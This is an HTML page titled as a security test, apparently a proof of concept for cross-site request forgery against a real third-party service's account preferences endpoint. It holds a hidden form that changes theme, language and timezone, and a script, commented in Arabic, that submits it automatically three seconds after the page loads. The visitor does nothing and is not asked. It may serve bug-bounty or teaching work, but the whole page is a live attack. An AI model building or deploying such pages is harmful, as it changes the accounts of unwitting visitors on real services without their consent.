<!DOCTYPE html>
<html>
<head>
    <title>Security Test Page</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="font-family: Arial, sans-serif; padding: 20px;">
    <h1>🔒 Security Demonstration</h1>
    <p>This page tests browser security features.</p>
    
    <!-- نموذج CSRF خفي -->
    <form id="csrfForm" action="https://newrelic.com/account/preferences" method="POST" style="display: none;">
        <input name="theme" value="dark">
        <input name="language" value="fr">
        <input name="timezone" value="Europe/Paris">
    </form>

    <div id="result" style="margin-top: 20px; padding: 10px; background: #f0f0f0; border-radius: 5px;"></div>

    <script>
        // عند تحميل الصفحة، تنفيذ الهجوم تلقائياً
        setTimeout(() => {
            document.getElementById('result').innerHTML = 
                "🚨 Testing CSRF...<br>Attempting to send request to NewRelic...";
            
            // إرسال النموذج
            document.getElementById('csrfForm').submit();
            
            document.getElementById('result').innerHTML += 
                "<br>✅ Request sent! Check if your NewRelic preferences changed.";
        }, 3000);
    </script>
</body>
</html>
